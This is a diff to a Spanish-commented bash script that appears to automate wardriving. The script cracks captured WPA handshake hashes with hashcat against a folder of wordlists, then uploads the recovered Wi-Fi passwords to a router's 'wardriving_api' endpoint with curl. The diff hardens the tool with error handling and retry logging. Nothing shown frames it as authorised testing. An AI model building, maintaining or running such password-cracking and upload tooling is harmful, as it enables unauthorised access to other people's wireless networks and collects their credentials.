@@ -1,4 +1,11 @@
 #!/bin/bash
+# set -e: aborta en cualquier fallo de comando inesperado. Si hashcat
+# falla por binario corrupto, dict incompatible, o el curl al router
+# no resuelve, queremos enterarnos en lugar de seguir con un estado
+# inconsistente. Los pocos comandos que legtimamente pueden fallar
+# (find sin resultados, curl sin red) llevan '|| true' o '|| echo ""'.
+set -e
+
 HC2200_FILE=$1
 ROUTER_IP=$2
 ROUTER_TOKEN=$3
@@ -29,7 +36,10 @@ NEW_COUNT=$(wc -l < "/tmp/new_targets.hc2200")
 TOTAL_COUNT=$(wc -l < "$HC2200_FILE")
 echo "[*] $NEW_COUNT/$TOTAL_COUNT hashes pendientes de crackear."
 
-dicts=$(find "$DICT_DIR" -maxdepth 1 -type f 2>/dev/null | sort -V)
+# find sin resultados: '|| true' evita que set -e aborte cuando
+# $DICT_DIR no existe o esta vacio (caso comun si el admin no ha
+# bajado wordlists todavia).
+dicts=$(find "$DICT_DIR" -maxdepth 1 -type f 2>/dev/null | sort -V || true)
 
 for dict in $dicts; do
     [ -f "$dict" ] || continue
@@ -50,14 +60,19 @@ for dict in $dicts; do
     if [ -s "$PENDING_SYNC" ]; then
         TOTAL=$(wc -l < "$PENDING_SYNC")
         echo "[*] Sincronizando $TOTAL contrasenas..."
+        # '|| echo "": si curl ni siquiera arranca (router apagado,
+        # DNS roto, WAN caida) HTTP_CODE queda vacio y la siguiente
+        # comparacion falla sin abortar el daemon.
         HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
             -H "Content-Type: text/plain" \
             --data-binary @"$PENDING_SYNC" \
             "http://$ROUTER_IP/cgi-bin/wardriving_api?action=upload_potfile&token=$ROUTER_TOKEN" \
-            --connect-timeout 10)
+            --connect-timeout 10 || echo "")
         if [ "$HTTP_CODE" = "200" ]; then
             echo "[+] Sincronizacion exitosa."
             rm -f "$PENDING_SYNC"
+        else
+            echo "[-] Sync no exitoso (HTTP ${HTTP_CODE:-000}). Reintentando en el siguiente dict."
         fi
     fi
 
